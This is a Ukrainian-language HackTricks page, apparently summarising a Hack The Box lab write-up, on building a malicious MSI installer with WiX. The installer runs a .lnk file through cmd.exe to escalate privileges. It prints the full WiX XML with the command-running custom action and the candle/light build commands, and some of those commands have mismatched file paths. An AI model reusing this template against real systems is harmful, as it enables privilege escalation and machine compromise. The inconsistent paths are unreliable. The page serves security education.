{{#include ../../banners/hacktricks-training.md}}

# Створення шкідливого MSI та отримання root

Створення MSI-інсталятора буде виконано за допомогою wixtools, зокрема буде використано [wixtools](http://wixtoolset.org). Варто зазначити, що були спроби використати альтернативні MSI-білдери, але в цьому конкретному випадку вони не були успішними.

Для всебічного розуміння прикладів використання wix MSI, рекомендується звернутися до [цієї сторінки](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Тут ви можете знайти різні приклади, які демонструють використання wix MSI.

Мета полягає в тому, щоб згенерувати MSI, який виконає файл lnk. Для досягнення цього можна використовувати наступний XML-код ([xml звідси](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Важливо зазначити, що елемент Package містить атрибути, такі як InstallerVersion та Compressed, які вказують версію інсталятора та вказують, чи пакет стиснутий, чи ні відповідно.

Процес створення передбачає використання candle.exe, інструменту з wixtools, для генерації wixobject з msi.xml. Наступну команду слід виконати:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Додатково варто зазначити, що в пості надано зображення, яке ілюструє команду та її вихід. Ви можете звернутися до нього для візуального керівництва.

Крім того, light.exe, ще один інструмент з wixtools, буде використано для створення MSI файлу з wixobject. Команда, яка буде виконана, виглядає наступним чином:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Схоже на попередню команду, у дописі включено зображення, яке ілюструє команду та її вихід.

Зверніть увагу, що хоча це резюме має на меті надати цінну інформацію, рекомендується звернутися до оригінального допису для отримання більш детальної інформації та точних інструкцій.

## References

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
